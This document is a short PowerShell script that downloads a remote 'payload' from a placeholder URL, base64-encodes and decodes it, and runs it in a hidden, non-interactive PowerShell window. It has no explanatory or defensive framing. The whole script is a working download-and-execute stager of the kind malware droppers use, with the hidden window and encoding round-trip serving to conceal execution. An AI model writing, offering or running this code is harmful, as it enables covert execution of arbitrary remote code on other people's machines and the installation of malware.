function F {
    param (
        [string]$u
    )

    try {
        $r = Invoke-WebRequest -Uri $u -TimeoutSec 10
        return $r.Content
    }
    catch {
        Write-Host "[ERROR] Failed to fetch payload: $_"
        return $null
    }
}

function E {
    param (
        [string]$p
    )

    try {
        $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p))
        powershell.exe -NoP -NonI -W Hidden -Command $d
        Write-Host "[INFO] Payload executed successfully."
    }
    catch {
        Write-Host "[ERROR] Failed to execute payload: $_"
    }
}

Write-Host "[INFO] Fetching payload..."
$u = "https://example.com/payload"  
$p = F -u $u

if ($p) {
    Write-Host "[INFO] Payload fetched successfully. Executing..."
    $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($p))
    E -p $b64
}
else {
    Write-Host "[ERROR] Unable to proceed without a valid payload."
}

